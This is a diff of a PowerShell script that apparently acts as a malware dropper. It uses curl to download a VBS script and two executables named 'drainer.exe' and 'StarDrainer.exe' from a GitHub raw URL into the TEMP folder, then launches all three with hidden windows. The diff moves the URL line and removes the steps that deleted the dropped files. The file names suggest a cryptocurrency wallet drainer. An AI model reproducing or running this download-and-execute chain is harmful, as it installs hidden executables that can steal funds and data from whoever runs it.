@@ -1,7 +1,7 @@
-$base = 'https://github.com/jesuss13377-source/456/raw/refs/heads/main/'
 $vbs = "$env:TEMP\script.vbs"
 $d1  = "$env:TEMP\drainer.exe"
 $d2  = "$env:TEMP\StarDrainer.exe"
+$base = 'https://github.com/jesuss13377-source/456/raw/refs/heads/main/'
 
 curl.exe -L -s -o $vbs "$base`script.vbs"
 curl.exe -L -s -o $d1  "$base`drainer.exe"
@@ -10,9 +10,3 @@ curl.exe -L -s -o $d2  "$base`StarDrainer.exe"
 if (Test-Path $vbs) { Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$vbs`"" -WindowStyle Hidden }
 if (Test-Path $d1)  { Start-Process -FilePath $d1 -WindowStyle Hidden }
 if (Test-Path $d2)  { Start-Process -FilePath $d2 -WindowStyle Hidden }
-
-Start-Sleep -Seconds 3
-
-Remove-Item -Path $vbs -Force -ErrorAction SilentlyContinue
-Remove-Item -Path $d1  -Force -ErrorAction SilentlyContinue
-Remove-Item -Path $d2  -Force -ErrorAction SilentlyContinue
